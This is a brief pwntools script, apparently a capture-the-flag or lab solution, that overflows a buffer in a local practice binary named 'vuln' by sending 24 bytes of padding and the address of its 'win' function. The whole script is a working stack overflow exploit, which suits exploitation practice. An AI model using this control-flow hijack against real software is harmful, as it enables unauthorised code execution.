from pwn import *

io = process("./vuln")
elf = ELF("./vuln")

print(io.recvuntil(b"Enter your name: "))

# *************** EXPLOIT PART *************** #

payload = b""
win_function = p64(elf.sym['win'])
padding = b"A" * 24

payload += padding + win_function

# *************** EXPLOIT END *************** #

io.sendline(payload)

io.interactive()
